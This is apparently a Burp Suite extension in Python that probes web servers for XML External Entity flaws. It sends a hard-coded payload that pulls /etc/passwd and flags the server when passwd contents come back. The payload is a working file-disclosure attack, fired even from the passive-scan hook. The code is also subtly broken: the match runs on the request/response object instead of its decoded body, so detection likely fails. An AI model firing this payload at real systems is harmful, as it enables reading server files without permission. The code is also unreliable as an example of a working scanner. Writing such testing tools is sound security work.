from burp import IBurpExtender, IScannerCheck, IScanIssue
from java.io import PrintWriter
from java.util import ArrayList

XXE_PAYLOAD = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>"

class BurpExtender(IBurpExtender, IScannerCheck):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()

        callbacks.setExtensionName("XXE Detector")
        callbacks.registerScannerCheck(self)

        self.stdout = PrintWriter(callbacks.getStdout(), True)
        self.stderr = PrintWriter(callbacks.getStderr(), True)

    def doActiveScan(self, baseRequestResponse, insertionPoint):
        return self.detect_xxe(baseRequestResponse)

    def doPassiveScan(self, baseRequestResponse):
        return self.detect_xxe(baseRequestResponse)

    def detect_xxe(self, baseRequestResponse):
        request_info = self._helpers.analyzeRequest(baseRequestResponse)
        headers = request_info.getHeaders()

        # Change Content-Type header
        new_headers = ArrayList()
        for header in headers:
            if header.startswith("Content-Type:"):
                new_headers.add("Content-Type: application/xml")
            else:
                new_headers.add(header)

        new_body = self._helpers.stringToBytes(XXE_PAYLOAD)
        new_message = self._helpers.buildHttpMessage(new_headers, new_body)
        response = self._callbacks.makeHttpRequest(request_info.getUrl(), new_message)
        
        if "root:x:0:0" in response:
            return [CustomScanIssue(baseRequestResponse.getHttpService(),
                                    self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                    [self._callbacks.applyMarkers(baseRequestResponse, None, None)],
                                    "XXE Vulnerability Detected",
                                    "The application appears to be vulnerable to XML External Entity (XXE) attacks.",
                                    "High",
                                    "Firm")]

        return None

class CustomScanIssue(IScanIssue):
    def __init__(self, http_service, url, request_response, name, detail, severity, confidence):
        self._http_service = http_service
        self._url = url
        self._request_response = request_response
        self._name = name
        self._detail = detail
        self._severity = severity
        self._confidence = confidence

    def getUrl(self):
        return self._url

    def getHttpMessages(self):
        return self._request_response

    def getHttpService(self):
        return self._http_service

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return self._confidence

    def getIssueBackground(self):
        return None

    def getRemediationBackground(self):
        return None

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        return None

    def getIssuePriority(self):
        return 1

